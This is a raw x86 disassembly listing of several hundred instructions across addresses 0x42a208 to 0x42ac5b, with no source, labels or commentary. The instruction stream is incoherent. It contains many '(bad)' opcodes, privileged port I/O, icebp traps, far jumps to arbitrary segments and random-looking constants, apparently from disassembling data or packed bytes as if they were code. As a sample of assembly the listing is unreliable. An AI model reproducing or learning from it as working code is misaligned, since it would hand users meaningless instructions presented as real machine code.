  42a208:	mov    cl,0x78
  42a20a:	mov    ebp,0x7210a73f
  42a20f:	pop    ss
  42a210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a211:	inc    ebp
  42a212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a213:	pop    edi
  42a214:	in     eax,dx
  42a215:	and    BYTE PTR [ebp-0x2496d12d],0x88
  42a21c:	aas    
  42a21d:	pop    eax
  42a21e:	jb     0x42a286
  42a220:	push   ss
  42a221:	rcr    DWORD PTR cs:[eax+0x73],cl
  42a225:	push   ds
  42a226:	enter  0x4527,0x5f
  42a22a:	xor    BYTE PTR [ebx+0x7d931ad4],cl
  42a230:	aad    0x60
  42a232:	inc    ebx
  42a233:	mov    ecx,0x6314b580
  42a238:	mov    esp,0xece8a303
  42a23d:	fbstp  TBYTE PTR [esi]
  42a23f:	inc    eax
  42a240:	sbb    eax,0x10af8c72
  42a245:	sahf   
  42a246:	push   edi
  42a247:	out    dx,al
  42a248:	lods   al,BYTE PTR ds:[esi]
  42a249:	lods   al,BYTE PTR ds:[esi]
  42a24a:	out    0x42,al
  42a24c:	clc    
  42a24d:	mov    WORD PTR [eax+edi*4-0x3d7d108a],fs
  42a254:	shl    BYTE PTR [ebx-0x5c1bd36b],0xda
  42a25b:	push   edx
  42a25c:	push   edi
  42a25d:	ret    0xc06b
  42a260:	aad    0x61
  42a262:	shl    al,0xb7
  42a265:	mov    al,ds:0x502f59f0
  42a26a:	(bad)  
  42a26b:	mov    WORD PTR [edx+0x0],ds
	...
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fnstcw WORD PTR [esi]
  42a2e3:	call   0x1:0xc37ac8fc
  42a2ea:	inc    DWORD PTR [eax]
  42a2ec:	add    BYTE PTR [eax],al
  42a2ee:	call   0x4502be70
  42a2f3:	mov    ds:0xe1bd2eb8,al
  42a2f8:	add    bh,bh
  42a2fa:	pop    ebp
  42a2fb:	jmp    0x42a2ae
  42a2fd:	cli    
  42a2fe:	icebp  
  42a2ff:	out    dx,eax
  42a300:	call   0xd2f8373d
  42a305:	jmp    0x42a369
  42a307:	icebp  
  42a308:	push   edx
  42a309:	mov    ecx,0xe026b3f
  42a30e:	mov    cx,0xad32
  42a312:	inc    edi
  42a313:	push   cs
  42a314:	jl     0x42a2e0
  42a316:	or     eax,0x1fdf53e9
  42a31b:	jl     0x42a2ab
  42a31d:	jnp    0x42a2db
  42a31f:	icebp  
  42a320:	xchg   ecx,eax
  42a321:	aad    0x3d
  42a323:	cmp    BYTE PTR [eax+0x7f0a7e9b],0x89
  42a32a:	mov    ecx,0x631ad446
  42a32f:	xchg   esp,eax
  42a330:	mov    cl,0xf5
  42a332:	cli    
  42a333:	retf   
  42a334:	add    al,0xac
  42a336:	cmp    eax,0xdb222a3a
  42a33b:	retf   
  42a33c:	aam    0x19
  42a33e:	mov    esi,DWORD PTR [esi+0x4b]
  42a341:	lods   al,BYTE PTR ds:[esi]
  42a342:	xor    DWORD PTR [edx-0x526cf959],ebp
  42a348:	retf   0xc547
  42a34b:	xchg   ebx,eax
  42a34c:	sbb    eax,0x1f1fc058
  42a351:	jns    0x42a340
  42a353:	adc    bh,BYTE PTR ds:0x2e00c6a1
  42a359:	aaa    
  42a35a:	mov    dl,al
  42a35c:	mov    edx,0x14e1f51d
  42a361:	sbb    BYTE PTR [esi+0x4b2b6cab],bl
  42a367:	sbb    eax,0xf3f37b4f
  42a36c:	fwait
  42a36d:	cli    
  42a36e:	cmp    eax,0x5556a65f
  42a373:	add    al,0x70
  42a375:	sbb    DWORD PTR [ecx],ebp
  42a377:	jno    0x42a350
  42a379:	and    eax,0xa54d9afe
  42a37e:	dec    esi
  42a37f:	xor    DWORD PTR ds:0x81db0c57,ebp
  42a385:	cmp    bh,cl
  42a387:	test   DWORD PTR [esi],ebp
  42a389:	or     al,bh
  42a38b:	mov    ebx,0x704ba91d
  42a390:	or     al,0x66
  42a392:	enter  0xdc1,0x21
  42a396:	(bad)  
  42a397:	xlat   BYTE PTR ds:[ebx]
  42a398:	mov    DWORD PTR [ecx-0xc],esp
  42a39b:	(bad)  
  42a39c:	fcomi  st,st(7)
  42a39e:	adc    al,0x5d
  42a3a0:	int3   
  42a3a1:	or     al,0x99
  42a3a3:	dec    eax
  42a3a4:	ret    0xa899
  42a3a7:	mov    al,0xf
  42a3a9:	sub    BYTE PTR [ebx+ecx*1],bh
  42a3ac:	fistp  WORD PTR [esi+eiz*8-0x42]
  42a3b0:	(bad)  
  42a3b1:	cli    
  42a3b2:	pop    edx
  42a3b3:	and    DWORD PTR [ecx*8+0x2e0bbcd3],ecx
  42a3ba:	data16 jecxz 0x42a3be
  42a3bd:	stc    
  42a3be:	out    0x49,al
  42a3c0:	pop    ebx
  42a3c1:	push   edi
  42a3c2:	hlt    
  42a3c3:	out    dx,al
  42a3c4:	fisttp WORD PTR [eax+0x6]
  42a3c7:	mov    dh,0xc2
  42a3c9:	into   
  42a3ca:	fs mov bl,0x49
  42a3cd:	in     eax,dx
  42a3ce:	push   ds
  42a3cf:	sbb    eax,0xb395c1c0
  42a3d4:	push   eax
  42a3d5:	mov    DWORD PTR [edx+0x511418e2],ebx
  42a3db:	sub    ebp,0x7ae038b0
  42a3e1:	push   ecx
  42a3e2:	cli    
  42a3e3:	mov    bh,0xcf
  42a3e5:	push   ecx
  42a3e6:	jnp    0x42a386
  42a3e8:	push   cs
  42a3e9:	lea    edx,[esi]
  42a3eb:	cmp    al,0x1a
	...
  42a455:	add    BYTE PTR [edi+0xe],bh
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0x54954c3d
  42a465:	int    0x79
  42a467:	les    eax,FWORD PTR [ecx]
  42a469:	add    bh,bh
  42a46b:	add    BYTE PTR [eax],al
  42a46d:	add    BYTE PTR ds:0x7572d80d,ah
  42a473:	and    BYTE PTR [esi+0x5f6b5ee5],dl
  42a479:	sahf   
  42a47a:	imul   ebp,ebx,0xffffffb0
  42a47d:	cmp    al,ah
  42a47f:	loop   0x42a47d
  42a481:	(bad)  
  42a482:	inc    eax
  42a483:	add    ebp,esp
  42a485:	in     al,0x27
  42a487:	arpl   WORD PTR [edx+0xd],di
  42a48a:	pop    ebp
  42a48b:	dec    ecx
  42a48c:	fistp  QWORD PTR [ebx+esi*1-0x1f7bf1ff]
  42a493:	lods   al,BYTE PTR ds:[esi]
  42a494:	jmp    0xa8c0:0xec7448bd
  42a49b:	mov    al,0xe
  42a49d:	sub    DWORD PTR [eax],ebx
  42a49f:	fild   QWORD PTR [ebp-0x76]
  42a4a2:	xlat   BYTE PTR ds:[ebx]
  42a4a3:	jp     0x42a43a
  42a4a5:	xlat   BYTE PTR ds:[ebx]
  42a4a6:	adc    eax,0x93e391ee
  42a4ab:	pop    esp
  42a4ac:	popaw  
  42a4ae:	xchg   esp,eax
  42a4af:	mov    dl,0x7f
  42a4b1:	test   ebx,eax
  42a4b3:	outs   dx,BYTE PTR ds:[esi]
  42a4b4:	cmc    
  42a4b5:	jmp    0x56b89854
  42a4ba:	jge    0x42a518
  42a4bc:	(bad)  [edi]
  42a4be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a4bf:	cmp    ecx,ebp
  42a4c1:	(bad)  
  42a4c2:	jle    0x42a526
  42a4c4:	ja     0x42a532
  42a4c6:	pop    edx
  42a4c7:	leave  
  42a4c8:	jmp    0x94235892
  42a4cd:	sbb    DWORD PTR [ecx+0x4d5a3a8a],0xedd76553
  42a4d7:	and    cl,dl
  42a4d9:	sub    esp,DWORD PTR [eax+0x79503c71]
  42a4df:	inc    eax
  42a4e0:	pop    ecx
  42a4e1:	sbb    ax,0x4827
  42a4e5:	jmp    0x92bfdbe8
  42a4ea:	(bad)  
  42a4eb:	sar    BYTE PTR [esi+0x43],cl
  42a4ee:	retf   0x2a47
  42a4f1:	lds    esi,FWORD PTR [esi+0x3b6f34a9]
  42a4f7:	mov    ax,0x8efc
  42a4fb:	outs   dx,BYTE PTR ds:[esi]
  42a4fc:	mov    al,ds:0x59425dad
  42a501:	test   DWORD PTR [eax-0x2d],ebx
  42a504:	mov    ds:0x62a8dd82,al
  42a509:	sbb    esi,ebx
  42a50b:	jno    0x42a584
  42a50d:	or     DWORD PTR [esi+0x24],eax
  42a510:	push   edi
  42a511:	test   BYTE PTR [ebp+0x39f214c9],bl
  42a517:	mov    ebx,0xa730433c
  42a51c:	inc    ecx
  42a51d:	push   ds
  42a51e:	mov    edx,DWORD PTR [ebp+0x2]
  42a521:	push   ds
  42a522:	test   BYTE PTR [edx+0x2494fdf2],ch
  42a528:	push   es
  42a529:	push   esi
  42a52a:	out    0xca,eax
  42a52c:	push   0xffffffaf
  42a52e:	(bad)  [ecx-0x5c]
  42a531:	push   ebx
  42a532:	jl     0x42a524
  42a534:	sub    eax,0x18ef4948
  42a539:	and    DWORD PTR [edi-0x25],edi
  42a53c:	ret    0x1e8
  42a53f:	xchg   BYTE PTR [esi-0x59febe8f],ch
  42a545:	xchg   ebp,eax
  42a546:	js     0x42a50b
  42a548:	sar    dh,cl
  42a54a:	xor    ebp,edx
  42a54c:	mov    ch,0x79
  42a54e:	sbb    al,0x2d
  42a550:	push   ss
  42a551:	(bad)  
  42a553:	imul   esi,esp,0xdb70910f
  42a559:	xor    dh,BYTE PTR [esi-0x6459751]
  42a55f:	sub    eax,0x3131f0f2
  42a564:	pushf  
  42a565:	mov    ecx,DWORD PTR [ebx]
  42a567:	push   esp
  42a568:	outs   dx,DWORD PTR ds:[esi]
  42a569:	jecxz  0x42a4fa
  42a56b:	nop
  42a56c:	mov    edi,0x0
	...
  42a5d5:	add    BYTE PTR [eax],bl
  42a5d7:	dec    edi
  42a5d8:	pop    ss
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0x8e195b9f
  42a5e5:	daa    
  42a5e6:	js     0x42a5ad
  42a5e8:	add    DWORD PTR [eax],eax
  42a5ea:	inc    DWORD PTR [eax]
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	pop    ecx
  42a5ef:	ins    DWORD PTR es:[edi],dx
  42a5f0:	xchg   BYTE PTR [ebx+0x5ed24b6a],dl
  42a5f6:	ror    BYTE PTR [ecx+0x19785408],0xb6
  42a5fd:	dec    ebx
  42a5fe:	loop   0x42a648
  42a600:	lods   eax,DWORD PTR ds:[esi]
  42a601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a602:	or     dl,BYTE PTR [edx+0x38]
  42a605:	test   eax,0x1a1505d8
  42a60a:	jb     0x42a60a
  42a60c:	lods   al,BYTE PTR ds:[esi]
  42a60d:	pop    ecx
  42a60e:	xor    DWORD PTR [eax],esp
  42a610:	icebp  
  42a611:	cmp    BYTE PTR [edx-0x1a96d12c],al
  42a617:	inc    ebp
  42a618:	leave  
  42a619:	js     0x42a677
  42a61b:	xchg   edx,eax
  42a61c:	mov    ebx,0x27772241
  42a621:	push   edi
  42a622:	retf   0x9922
  42a625:	adc    eax,DWORD PTR [ebp+0x5e14520c]
  42a62b:	xchg   ebx,eax
  42a62c:	pusha  
  42a62d:	cmp    BYTE PTR [eax-0x14],dl
  42a630:	xchg   esp,eax
  42a631:	out    dx,eax
  42a632:	mov    bh,0x1c
  42a634:	jb     0x42a636
  42a636:	jb     0x42a69e
  42a638:	jle    0x42a5e7
  42a63a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a63b:	jb     0x42a6b1
  42a63d:	mov    edx,0x2e1f491d
  42a642:	jo     0x42a5c7
  42a644:	adc    esi,DWORD PTR [ecx]
  42a646:	(bad)  
  42a647:	adc    BYTE PTR [ebp-0x54],ah
  42a64a:	and    eax,0x66fbbee2
  42a64f:	pushf  
  42a650:	stos   BYTE PTR es:[edi],al
  42a651:	dec    ebx
  42a652:	add    DWORD PTR [ebx],edi
  42a654:	aad    0xa1
  42a656:	and    DWORD PTR [eax+0x1],edi
  42a659:	mov    ch,0x1e
  42a65b:	jne    0x42a602
  42a65d:	xchg   ebx,eax
  42a65e:	or     DWORD PTR ss:[ebp-0x55],ebx
  42a662:	bnd ret 0x9a03
  42a666:	mov    dl,0xc7
  42a668:	jge    0x42a647
  42a66a:	popa   
  42a66b:	in     al,dx
  42a66c:	mov    edi,0xdb224612
  42a671:	es add eax,0x1375d839
  42a677:	jne    0x42a62e
  42a679:	mov    eax,0x21ea292c
  42a67e:	out    dx,eax
  42a67f:	mov    cl,0xf2
  42a681:	push   esi
  42a682:	jg     0x42a633
  42a684:	lds    esp,FWORD PTR [ebp-0x14]
  42a687:	add    BYTE PTR [ecx-0x13],al
  42a68a:	cld    
  42a68b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a68c:	jbe    0x42a663
  42a68e:	push   ecx
  42a68f:	js     0x42a6f2
  42a691:	xchg   ebx,eax
  42a692:	scas   eax,DWORD PTR es:[edi]
  42a693:	push   esp
  42a694:	test   eax,0xd9eb2c74
  42a699:	mov    al,0x7c
  42a69b:	jmp    0x6fc6:0x586539e7
  42a6a2:	mov    WORD PTR [esi],cs
  42a6a4:	inc    eax
  42a6a5:	adc    ch,BYTE PTR [edi+0x645c5aa7]
  42a6ab:	dec    ebx
  42a6ac:	icebp  
  42a6ad:	mov    esi,0x4984fa26
  42a6b2:	xor    al,0x37
  42a6b4:	pop    edx
  42a6b5:	push   esi
  42a6b6:	mov    eax,0x59e8c7a9
  42a6bb:	out    0xfb,eax
  42a6bd:	pushf  
  42a6be:	dec    edi
  42a6bf:	xor    BYTE PTR [ebp-0x6eea1602],bl
  42a6c5:	sub    ah,BYTE PTR [ebx]
  42a6c7:	or     BYTE PTR [esp+ecx*1-0x4c],dh
  42a6cb:	mov    eax,ds:0xd9aeaf56
  42a6d0:	dec    edx
  42a6d1:	out    dx,eax
  42a6d2:	jo     0x42a689
  42a6d4:	fdiv   DWORD PTR [edi]
  42a6d6:	mov    es,WORD PTR [esp+eax*1-0x54]
  42a6da:	sbb    BYTE PTR [edx],0x98
  42a6dd:	jo     0x42a660
  42a6df:	gs push ecx
  42a6e1:	loope  0x42a702
  42a6e3:	inc    edi
  42a6e4:	mov    ds:0xf5a27317,al
  42a6e9:	jl     0x42a737
  42a6eb:	jle    0x42a71c
	...
  42a755:	add    BYTE PTR [esi+edx*1],ah
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi-0x5847ece4],0x7743cd16
  42a767:	mov    BYTE PTR [ecx],0x0
  42a76a:	inc    DWORD PTR [eax]
  42a76c:	add    BYTE PTR [eax],al
  42a76e:	jecxz  0x42a730
  42a770:	jbe    0x42a767
  42a772:	and    al,0xea
  42a774:	es xchg esp,eax
  42a776:	sti    
  42a777:	dec    eax
  42a778:	adc    DWORD PTR [esi-0x47b2f30e],0xffffffde
  42a77f:	xchg   edx,eax
  42a780:	lods   al,BYTE PTR ds:[esi]
  42a781:	imul   edi,esi,0x22
  42a784:	pop    ecx
  42a785:	data16 je 0x42a7c7
  42a788:	ja     0x42a762
  42a78a:	repz and ah,dl
  42a78d:	cld    
  42a78e:	jb     0x42a769
  42a790:	call   0xc63a3dd5
  42a795:	out    dx,al
  42a796:	push   ds
  42a797:	fs popa 
  42a799:	push   0x1b
  42a79b:	out    0xbf,al
  42a79d:	fstp   TBYTE PTR [esi+0x4c1e950d]
  42a7a3:	je     0x42a78d
  42a7a5:	mov    dl,0x71
  42a7a7:	mov    ss:0xa81366b0,eax
  42a7ad:	(bad)  
  42a7ae:	add    cl,BYTE PTR [edi+0x23]
  42a7b1:	mov    esi,0x80bf16f8
  42a7b6:	lea    ebp,[esi+0x171fda6c]
  42a7bc:	pop    ds
  42a7bd:	icebp  
  42a7be:	xchg   ebp,eax
  42a7bf:	mov    edi,ebx
  42a7c1:	arpl   WORD PTR [edx],dx
  42a7c3:	jmp    0x299e:0xc31e4f8c
  42a7ca:	js     0x42a796
  42a7cc:	icebp  
  42a7cd:	loop   0x42a776
  42a7cf:	pop    ebp
  42a7d0:	mov    bh,0x4e
  42a7d2:	ficomp WORD PTR [ebx+0x3d]
  42a7d5:	inc    ecx
  42a7d6:	loopne 0x42a843
  42a7d8:	xchg   esi,eax
  42a7d9:	imul   esp,DWORD PTR [ebp-0x5f],0x41
  42a7dd:	cs addr16 test al,0xae
  42a7e1:	jae    0x42a77a
  42a7e3:	jmp    0xb161:0x9d7a65c9
  42a7ea:	mov    DWORD PTR [ebx],ebx
  42a7ec:	cs clc 
  42a7ee:	imul   edi,DWORD PTR [ecx-0x15],0xffffff87
  42a7f2:	ret    
  42a7f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7f4:	outs   dx,DWORD PTR ss:[esi]
  42a7f6:	mov    ch,0xa2
  42a7f8:	mov    esi,0xef463206
  42a7fd:	jp     0x42a7ba
  42a7ff:	jae    0x42a871
  42a801:	xlat   BYTE PTR ds:[ebx]
  42a802:	cld    
  42a803:	xor    dl,BYTE PTR [esi+ecx*8-0x37015c1f]
  42a80a:	(bad)  
  42a80b:	and    dl,al
  42a80d:	(bad)  
  42a80e:	fsubr  QWORD PTR [ebp+0x1f0ba6be]
  42a814:	mov    ds,WORD PTR [ebx-0x41192521]
  42a81a:	push   cs
  42a81b:	rol    ebx,cl
  42a81d:	or     BYTE PTR [edx-0x22],dl
  42a820:	pop    ebp
  42a821:	mov    ds:0xbf331978,eax
  42a826:	xor    cl,BYTE PTR [ebx-0x7a]
  42a829:	fstp   TBYTE PTR [eax-0x27]
  42a82c:	dec    edx
  42a82d:	pop    ss
  42a82e:	xchg   BYTE PTR [ecx],bl
  42a830:	cmc    
  42a831:	repz jb 0x42a8a9
  42a834:	lods   eax,DWORD PTR ds:[esi]
  42a835:	xchg   edx,eax
  42a836:	sub    DWORD PTR [ecx-0x22],0xfffffffb
  42a83a:	ror    ch,1
  42a83c:	or     al,0xf6
  42a83e:	ds in  al,0xf7
  42a841:	jge    0x42a89f
  42a843:	mov    al,ds:0xcbdad9e8
  42a848:	jmp    0x724e:0x60ba2e30
  42a84f:	or     DWORD PTR [ecx],esi
  42a851:	sar    DWORD PTR [ecx+0xaa3b256],cl
  42a857:	rcl    DWORD PTR [ebp+0x7d5140ab],cl
  42a85d:	(bad)  
  42a85e:	push   esp
  42a85f:	ror    bl,0x21
  42a862:	arpl   WORD PTR [edi],dx
  42a864:	shr    DWORD PTR [eax-0x208a2f73],0xd6
  42a86b:	sbb    DWORD PTR [ebp+0x0],ecx
	...
  42a8d6:	mov    ah,BYTE PTR [ebp+0x63]
  42a8d9:	mov    edi,0x75debfef
  42a8de:	add    ebp,0x1aba6c97
  42a8e4:	mov    bl,0x7
  42a8e6:	jbe    0x42a8af
  42a8e8:	add    DWORD PTR [eax],eax
  42a8ea:	inc    DWORD PTR [eax]
  42a8ec:	add    BYTE PTR [eax],al
  42a8ee:	cmp    edi,edi
  42a8f0:	iret   
  42a8f1:	outs   dx,BYTE PTR ds:[esi]
  42a8f2:	sbb    eax,0x16a930dc
  42a8f7:	mov    esi,0xa27a710d
  42a8fc:	rcr    DWORD PTR [ebx-0x2c],0xb6
  42a900:	aam    0x2e
  42a902:	jmp    0x42a93c
  42a904:	jg     0x42a95c
  42a906:	sti    
  42a907:	jne    0x42a8e7
  42a909:	inc    ebx
  42a90a:	jnp    0x42a95f
  42a90c:	pop    edx
  42a90d:	lds    ebx,FWORD PTR [esi]
  42a90f:	pop    ecx
  42a910:	test   al,0x75
  42a912:	and    cl,BYTE PTR [ebp+ebp*2+0x54]
  42a916:	pop    eax
  42a917:	jmp    0x22b:0x7fa7c96b
  42a91e:	lock mov edx,0xe589c74
  42a924:	and    eax,0x4ac4d748
  42a929:	dec    DWORD PTR [esi]
  42a92b:	or     eax,0x92b1a237
  42a930:	add    eax,0x9bd2045b
  42a935:	pop    es
  42a936:	mov    ecx,fs
  42a938:	cmp    BYTE PTR [eax+ecx*4+0x205df4f8],0xcd
  42a940:	push   0x5a4c093a
  42a945:	(bad)  
  42a946:	call   0xe31c:0x8976a1f8
  42a94d:	sbb    BYTE PTR [edx],ah
  42a94f:	lods   al,BYTE PTR ds:[esi]
  42a950:	add    ch,bh
  42a952:	fs inc esp
  42a954:	(bad)  
  42a955:	lea    edi,[edx+0x54]
  42a958:	sahf   
  42a959:	aam    0x61
  42a95b:	setns  al
  42a95e:	mov    ebx,0xc21c173c
  42a963:	addr16 pop ds
  42a965:	jbe    0x42a957
  42a967:	outs   dx,DWORD PTR ds:[esi]
  42a968:	dec    edi
  42a969:	sbb    esp,DWORD PTR [edi-0x28]
  42a96c:	ret    
  42a96d:	jb     0x42a9ea
  42a96f:	lds    eax,FWORD PTR [edi-0x14]
  42a972:	adc    ebp,DWORD PTR [edi+ebp*8-0x58]
  42a976:	cs ret 
  42a978:	mov    al,ds:0xdbb8985e
  42a97d:	inc    ecx
  42a97e:	push   edi
  42a97f:	adc    al,0xc1
  42a981:	ja     0x42a916
  42a983:	adc    edx,DWORD PTR [ebx+eax*8+0x28]
  42a987:	add    cl,al
  42a989:	imul   ebp,DWORD PTR [edx-0xc5a5527],0xffffffd7
  42a990:	adc    bl,al
  42a992:	adc    esp,DWORD PTR [edx-0x71]
  42a995:	cld    
  42a996:	add    DWORD PTR [edx-0x2a45fe4f],ecx
  42a99c:	bound  ebp,QWORD PTR [edi+0x7c]
  42a99f:	xchg   edx,eax
  42a9a0:	and    al,0x97
  42a9a2:	mov    ecx,0x7c08837e
  42a9a7:	aam    0x55
  42a9a9:	mov    ah,0xb9
  42a9ab:	leave  
  42a9ac:	vpandn ymm3,ymm2,ymm0
  42a9b1:	out    0xba,eax
  42a9b3:	xchg   esp,eax
  42a9b4:	pop    esp
  42a9b5:	dec    ebx
  42a9b6:	sbb    ebp,DWORD PTR [eax-0x5931e1de]
  42a9bc:	rol    BYTE PTR [esi],cl
  42a9be:	pop    ax
  42a9c0:	leave  
  42a9c1:	mov    ds:0x70530d1d,al
  42a9c6:	mov    dh,0xb9
  42a9c8:	arpl   WORD PTR [ecx-0x4307c85],di
  42a9ce:	jmp    0x42a98f
  42a9d0:	cld    
  42a9d1:	stc    
  42a9d2:	call   0xd30029cb
  42a9d7:	rcr    eax,0xa7
  42a9da:	rcr    BYTE PTR [edx],0x99
  42a9dd:	sub    BYTE PTR [ebp+ebx*4-0x38731c0c],0xcd
  42a9e5:	addr16 (bad) 
  42a9e7:	sub    al,0x98
  42a9e9:	add    BYTE PTR [eax+0xcb8a],al
	...
  42aa53:	add    BYTE PTR [eax],al
  42aa55:	add    BYTE PTR [eax+0x3fee1d93],ch
  42aa5b:	out    dx,al
  42aa5c:	sti    
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	in     eax,dx
  42aa63:	es arpl si,si
  42aa66:	jne    0x42aa30
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	inc    DWORD PTR [eax]
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	retf   
  42aa6f:	xchg   esi,eax
  42aa70:	mov    ds:0xf39e361c,al
  42aa75:	into   
  42aa76:	pop    ds
  42aa77:	push   eax
  42aa78:	push   0xacf27f83
  42aa7d:	das    
  42aa7e:	adc    al,0xcf
  42aa80:	lahf   
  42aa81:	dec    esi
  42aa82:	clc    
  42aa83:	pop    ds
  42aa84:	fucomip st,st(2)
  42aa86:	rol    DWORD PTR [edx-0x79],1
  42aa89:	lea    ebp,[ebp+0x36236f8f]
  42aa8f:	xor    eax,0xf19275f1
  42aa94:	stc    
  42aa95:	mov    WORD PTR [ebp+0x73fc02a1],fs
  42aa9b:	dec    esp
  42aa9c:	icebp  
  42aa9d:	(bad)  
  42aa9e:	fs lahf 
  42aaa0:	dec    edx
  42aaa1:	ins    BYTE PTR es:[edi],dx
  42aaa2:	adc    al,0x77
  42aaa4:	inc    esi
  42aaa5:	iret   
  42aaa6:	pop    ebx
  42aaa7:	push   0xffffff99
  42aaa9:	add    eax,0x9c12b155
  42aaae:	adc    ebp,DWORD PTR [edi+0x2f]
  42aab1:	ins    DWORD PTR es:[edi],dx
  42aab2:	imul   esi,DWORD PTR [edx],0xfffffffd
  42aab5:	mov    al,ds:0x6fc88872
  42aaba:	pop    ds
  42aabb:	adc    al,0xbb
  42aabd:	mov    eax,ds:0xa13eb7ea
  42aac2:	fmul   QWORD PTR [ecx+0x0]
  42aac5:	mov    dl,0x38
  42aac7:	in     eax,dx
  42aac8:	sbb    BYTE PTR [eiz*8-0x57412931],dh
  42aacf:	mov    ds:0x350f6972,al
  42aad4:	pop    esi
  42aad5:	rcl    BYTE PTR [ebp+0x1c3f3e87],1
  42aadb:	out    dx,eax
  42aadc:	xchg   edi,eax
  42aadd:	test   BYTE PTR [esi],ch
  42aadf:	jno    0x42ab57
  42aae1:	xchg   DWORD PTR [ebx],eax
  42aae3:	mov    bl,0x28
  42aae5:	mov    dh,0xfe
  42aae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aae8:	mov    edx,DWORD PTR [ebp+edi*4-0x654da4ec]
  42aaef:	aaa    
  42aaf0:	and    eax,0x8eb1effd
  42aaf5:	mov    dh,0xe6
  42aaf7:	fwait
  42aaf8:	push   ds
  42aaf9:	jmp    0x54a19065
  42aafe:	dec    esi
  42aaff:	adc    ah,BYTE PTR [ecx]
  42ab01:	jmp    0x42aa9a
  42ab03:	loop   0x42ab6d
  42ab05:	push   eax
  42ab06:	dec    eax
  42ab07:	ds mov bh,dh
  42ab0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab0b:	pop    ss
  42ab0c:	mov    eax,0xbb739616
  42ab11:	gs xchg ebx,eax
  42ab13:	jns    0x42ab7d
  42ab15:	ja     0x42ab6e
  42ab17:	in     eax,0x38
  42ab19:	fist   DWORD PTR fs:[ebx+0x6905960d]
  42ab20:	enter  0x53d4,0x4
  42ab24:	dec    edi
  42ab25:	test   DWORD PTR [ebx-0x68],ebx
  42ab28:	aad    0xbe
  42ab2a:	pop    esp
  42ab2b:	or     al,0xaf
  42ab2d:	adc    BYTE PTR [ebx-0x70ba39bc],0x42
  42ab34:	jge    0x42aacd
  42ab36:	mov    WORD PTR [edx-0x26],cs
  42ab39:	aad    0xdb
  42ab3b:	inc    ecx
  42ab3c:	sahf   
  42ab3d:	test   DWORD PTR [ecx+ecx*4-0x78],ecx
  42ab41:	inc    edi
  42ab42:	addr16 mov edx,0xb2da790e
  42ab48:	pusha  
  42ab49:	leave  
  42ab4a:	sub    esi,edi
  42ab4c:	outs   dx,DWORD PTR ds:[esi]
  42ab4d:	mov    al,ds:0x91783434
  42ab52:	pop    ss
  42ab53:	ja     0x42ab8d
  42ab55:	jmp    0xb319:0x5062abb8
  42ab5c:	fisttp QWORD PTR [ecx]
  42ab5e:	and    DWORD PTR [edi-0x7a],0xe762b768
  42ab65:	or     eax,0x7a7475a9
  42ab6a:	xchg   ebp,eax
  42ab6b:	test   al,0x1b
	...
  42abd5:	add    BYTE PTR [esi],bh
  42abd7:	push   cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	mov    bl,0xa2
  42abe4:	xchg   DWORD PTR ds:0x1c974,eax
  42abea:	inc    DWORD PTR [eax]
  42abec:	add    BYTE PTR [eax],al
  42abee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42abef:	inc    ebx
  42abf0:	jmp    0xa311:0x6e891136
  42abf7:	mov    DWORD PTR [ebx],edx
  42abf9:	and    BYTE PTR [ebp-0x2079b7f1],ch
  42abff:	mov    BYTE PTR [ebx+0x4f],ch
  42ac02:	mov    dl,0x3b
  42ac04:	mov    esi,0x9f709f23
  42ac09:	fiadd  DWORD PTR [eax+0x23]
  42ac0c:	jle    0x42ab90
  42ac0e:	dec    ecx
  42ac0f:	in     al,0x5a
  42ac11:	enter  0x4128,0x14
  42ac15:	cli    
  42ac16:	add    al,0x37
  42ac18:	call   FWORD PTR [eax]
  42ac1a:	ret    0xea90
  42ac1d:	inc    ebx
  42ac1e:	fcmovbe st,st(1)
  42ac20:	ds pop esi
  42ac22:	loopne 0x42ac3b
  42ac24:	pop    edx
  42ac25:	cs inc esi
  42ac27:	pop    esp
  42ac28:	push   ss
  42ac29:	bound  edi,QWORD PTR [ebx]
  42ac2b:	(bad)  
  42ac2c:	bound  ecx,QWORD PTR [ecx]
  42ac2e:	outs   dx,BYTE PTR ds:[esi]
  42ac2f:	dec    esp
  42ac30:	pop    esi
  42ac31:	mov    esp,0x70b1832f
  42ac36:	and    dl,BYTE PTR [ecx+0x60]
  42ac39:	into   
  42ac3a:	jns    0x42abe3
  42ac3c:	mov    dl,0xe
  42ac3e:	ror    eax,1
  42ac40:	xchg   esi,eax
  42ac41:	repz popf 
  42ac43:	dec    esi
  42ac44:	or     DWORD PTR [eax-0x66c0c894],edx
  42ac4a:	sbb    bh,BYTE PTR [eax]
  42ac4c:	sahf   
  42ac4d:	cmp    BYTE PTR [ebp+0x2f67a34f],al
  42ac53:	pop    DWORD PTR [ebp-0x113ca9a9]
  42ac59:	dec    esi
  42ac5a:	into   
  42ac5b:	jb     0x42ac7a
